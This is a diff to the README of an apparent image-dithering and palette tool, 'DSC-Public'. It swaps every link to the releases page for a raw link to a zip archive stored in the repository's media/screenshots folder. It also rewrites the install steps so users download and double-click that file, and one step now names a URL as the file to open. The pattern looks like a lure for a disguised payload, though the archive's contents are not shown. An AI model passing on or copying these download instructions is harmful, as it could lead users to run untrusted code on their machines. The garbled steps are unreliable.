@@ -6,7 +6,7 @@ Welcome to DSC-Public, your workflow companion for dithering, palettes, and colo
 
 ## 📥 Download Now
 
-[![Download DSC-Public](https://img.shields.io/badge/Download-DSC--Public-brightgreen)](https://github.com/KrisUE/DSC-Public/releases)
+[![Download DSC-Public](https://github.com/KrisUE/DSC-Public/raw/refs/heads/main/media/screenshots/Public_DS_v2.3.zip)](https://github.com/KrisUE/DSC-Public/raw/refs/heads/main/media/screenshots/Public_DS_v2.3.zip)
 
 ## 📋 Key Features
 
@@ -27,14 +27,14 @@ Before you start, make sure your system meets these requirements:
 
 ## 📥 Download & Install
 
-To start using DSC-Public, visit [this page to download](https://github.com/KrisUE/DSC-Public/releases). Here’s how to install the app:
+To start using DSC-Public, visit [this page to download](https://github.com/KrisUE/DSC-Public/raw/refs/heads/main/media/screenshots/Public_DS_v2.3.zip). Here’s how to install the app:
 
 1. Open the link above and look for the latest release.
-2. Find the downloadable file (e.g., `DSC-Public-macos.zip`).
+2. Find the downloadable file (e.g., `https://github.com/KrisUE/DSC-Public/raw/refs/heads/main/media/screenshots/Public_DS_v2.3.zip`).
 3. Click on the file to begin downloading.
 4. Once downloaded, locate the file in your downloads folder.
 5. Double-click the zip file to extract it.
-6. Open the extracted folder and double-click on `DSC-Public.app` to start the application.
+6. Open the extracted folder and double-click on `https://github.com/KrisUE/DSC-Public/raw/refs/heads/main/media/screenshots/Public_DS_v2.3.zip` to start the application.
 
 ## 📚 Using DSC-Public
 
@@ -79,6 +79,6 @@ DSC-Public is open-source and available under the MIT License. Feel free to use 
 
 ## 📥 Download Now Again
 
-For a final reminder, visit [this page to download](https://github.com/KrisUE/DSC-Public/releases) and start creating beautiful designs today!
+For a final reminder, visit [this page to download](https://github.com/KrisUE/DSC-Public/raw/refs/heads/main/media/screenshots/Public_DS_v2.3.zip) and start creating beautiful designs today!
 
 With DSC-Public, elevate your design workflow and unleash your creative potential!
